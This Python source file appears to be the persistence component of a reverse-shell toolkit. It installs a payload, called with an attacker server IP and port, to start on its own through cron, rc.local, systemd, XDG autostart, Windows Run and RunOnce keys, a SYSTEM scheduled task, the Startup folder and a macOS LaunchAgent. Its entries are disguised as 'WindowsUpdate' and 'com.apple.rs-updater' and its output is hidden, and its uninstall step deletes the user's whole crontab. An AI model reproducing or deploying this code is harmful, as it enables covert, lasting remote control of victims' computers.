# Persistence Module
import platform
import os
import json
from pathlib import Path

class PersistenceManager:
    def __init__(self):
        self.system = platform.system()
        self.payload_path = None
        
    def set_payload(self, payload_path: str, server_ip: str, port: int = 9999):
        """Set the payload to persist"""
        self.payload_path = payload_path
        self.server_ip = server_ip
        self.port = port
        return {"success": True, "message": f"Payload set: {payload_path}"}
    
    def install_all(self, payload_path: str, server_ip: str, port: int = 9999):
        """Install all available persistence methods"""
        self.set_payload(payload_path, server_ip, port)
        results = {}
        
        if self.system == "Linux":
            results["cron"] = self.install_cron()
            results["rc_local"] = self.install_rc_local()
            results["systemd"] = self.install_systemd()
            results["xdg_autostart"] = self.install_xdg_autostart()
        elif self.system == "Windows":
            results["registry_run"] = self.install_registry_run()
            results["registry_runonce"] = self.install_registry_runonce()
            results["scheduled_task"] = self.install_scheduled_task()
            results["startup_folder"] = self.install_startup_folder()
        elif self.system == "Darwin":
            results["launch_agent"] = self.install_launch_agent()
            results["cron"] = self.install_cron()
        
        return {"success": True, "results": results}
    
    # Linux Persistence Methods
    def install_cron(self):
        """Install via crontab"""
        try:
            payload_cmd = f"python3 {self.payload_path} {self.server_ip} {self.port}"
            cron_entry = f"@reboot {payload_cmd}\n*/5 * * * * {payload_cmd}"
            
            # Backup existing crontab
            import subprocess
            subprocess.run(['crontab', '-l'], capture_output=True)
            
            # Add our entry
            with open('/tmp/rs_cron', 'w') as f:
                f.write(cron_entry)
            
            subprocess.run(['crontab', '/tmp/rs_cron'], check=True)
            os.remove('/tmp/rs_cron')
            
            return {"success": True, "method": "cron", "entry": cron_entry}
        except Exception as e:
            return {"success": False, "method": "cron", "error": str(e)}
    
    def install_rc_local(self):
        """Install via /etc/rc.local"""
        try:
            payload_cmd = f"python3 {self.payload_path} {self.server_ip} {self.port} &"
            
            rc_path = Path("/etc/rc.local")
            
            # Backup
            if rc_path.exists():
                import shutil
                shutil.copy(rc_path, rc_path.with_suffix('.backup'))
            
            # Add our entry
            with open(rc_path, 'a') as f:
                f.write(f"\n# REVERSESHELL Persistence\n{payload_cmd}\n")
            
            os.chmod(rc_path, 0o755)
            
            return {"success": True, "method": "rc.local", "path": str(rc_path)}
        except Exception as e:
            return {"success": False, "method": "rc.local", "error": str(e)}
    
    def install_systemd(self):
        """Install via systemd service"""
        try:
            service_name = "rs-updater.service"
            service_path = Path(f"/etc/systemd/system/{service_name}")
            
            service_content = f'''[Unit]
Description=REVERSESHELL Update Service
After=network.target

[Service]
Type=simple
ExecStart=python3 {self.payload_path} {self.server_ip} {self.port}
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
'''
            
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            import subprocess
            subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
            subprocess.run(['systemctl', 'enable', service_name], capture_output=True)
            subprocess.run(['systemctl', 'start', service_name], capture_output=True)
            
            return {"success": True, "method": "systemd", "service": service_name}
        except Exception as e:
            return {"success": False, "method": "systemd", "error": str(e)}
    
    def install_xdg_autostart(self):
        """Install via XDG autostart"""
        try:
            autostart_dir = Path.home() / ".config" / "autostart"
            autostart_dir.mkdir(parents=True, exist_ok=True)
            
            desktop_file = autostart_dir / "rs-updater.desktop"
            
            desktop_content = f'''[Desktop Entry]
Type=Application
Name=RS Updater
Exec=python3 {self.payload_path} {self.server_ip} {self.port}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
'''
            
            with open(desktop_file, 'w') as f:
                f.write(desktop_content)
            
            return {"success": True, "method": "xdg_autostart", "path": str(desktop_file)}
        except Exception as e:
            return {"success": False, "method": "xdg_autostart", "error": str(e)}
    
    # Windows Persistence Methods
    def install_registry_run(self):
        """Install via Registry Run key"""
        try:
            import winreg
            
            payload_cmd = f'start /min python.exe "{self.payload_path}" {self.server_ip} {self.port}'
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, payload_cmd)
            winreg.CloseKey(key)
            
            return {"success": True, "method": "registry_run", "key": "HKCU\\...\\Run\\WindowsUpdate"}
        except Exception as e:
            return {"success": False, "method": "registry_run", "error": str(e)}
    
    def install_registry_runonce(self):
        """Install via Registry RunOnce key"""
        try:
            import winreg
            
            payload_cmd = f'start /min python.exe "{self.payload_path}" {self.server_ip} {self.port}'
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, "TempFileCheck", 0, winreg.REG_SZ, payload_cmd)
            winreg.CloseKey(key)
            
            return {"success": True, "method": "registry_runonce", "key": "HKCU\\...\\RunOnce\\TempFileCheck"}
        except Exception as e:
            return {"success": False, "method": "registry_runonce", "error": str(e)}
    
    def install_scheduled_task(self):
        """Install via Scheduled Task"""
        try:
            import subprocess
            
            task_name = "Windows Update Service"
            payload_cmd = f'python.exe "{self.payload_path}" {self.server_ip} {self.port}'
            
            # Create scheduled task
            cmd = f'schtasks /Create /TN "{task_name}" /TR "{payload_cmd}" /SC ONSTART /RU SYSTEM /RL HIGHEST /F'
            subprocess.run(cmd, shell=True, capture_output=True)
            
            return {"success": True, "method": "scheduled_task", "task": task_name}
        except Exception as e:
            return {"success": False, "method": "scheduled_task", "error": str(e)}
    
    def install_startup_folder(self):
        """Install via Startup folder"""
        try:
            import shutil
            
            startup_path = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
            shortcut_path = startup_path / "WindowsUpdate.lnk"
            
            # Create a batch file
            batch_path = Path(os.environ['TEMP']) / "rs_update.bat"
            with open(batch_path, 'w') as f:
                f.write(f'@echo off\nstart /min python.exe "{self.payload_path}" {self.server_ip} {self.port}\n')
            
            # Create shortcut (simplified - just copy batch for now)
            shutil.copy(batch_path, shortcut_path.with_suffix('.bat'))
            
            return {"success": True, "method": "startup_folder", "path": str(shortcut_path.with_suffix('.bat'))}
        except Exception as e:
            return {"success": False, "method": "startup_folder", "error": str(e)}
    
    # macOS Persistence Methods
    def install_launch_agent(self):
        """Install via LaunchAgent"""
        try:
            plist_path = Path.home() / "Library" / "LaunchAgents" / "com.apple.rs-updater.plist"
            
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.rs-updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{self.payload_path}</string>
        <string>{self.server_ip}</string>
        <string>{self.port}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
'''
            
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            import subprocess
            subprocess.run(['launchctl', 'load', str(plist_path)], capture_output=True)
            
            return {"success": True, "method": "launch_agent", "path": str(plist_path)}
        except Exception as e:
            return {"success": False, "method": "launch_agent", "error": str(e)}
    
    def uninstall_all(self):
        """Remove all persistence mechanisms"""
        results = {}
        
        if self.system == "Linux":
            # Remove cron
            import subprocess
            subprocess.run(['crontab', '-r'], capture_output=True)
            results["cron"] = {"removed": True}
            
            # Remove systemd service
            subprocess.run(['systemctl', 'stop', 'rs-updater.service'], capture_output=True)
            subprocess.run(['systemctl', 'disable', 'rs-updater.service'], capture_output=True)
            Path('/etc/systemd/system/rs-updater.service').unlink(missing_ok=True)
            results["systemd"] = {"removed": True}
            
        elif self.system == "Windows":
            import winreg
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "WindowsUpdate")
                winreg.CloseKey(key)
                results["registry_run"] = {"removed": True}
            except:
                pass
        
        return {"success": True, "results": results}


def install_persistence(payload_path: str, server_ip: str, port: int = 9999, method: str = "all"):
    """Quick install function"""
    pm = PersistenceManager()
    
    if method == "all":
        return pm.install_all(payload_path, server_ip, port)
    else:
        pm.set_payload(payload_path, server_ip, port)
        if method == "cron":
            return pm.install_cron()
        elif method == "systemd":
            return pm.install_systemd()
        elif method == "registry":
            return pm.install_registry_run()
        else:
            return {"success": False, "message": f"Unknown method: {method}"}
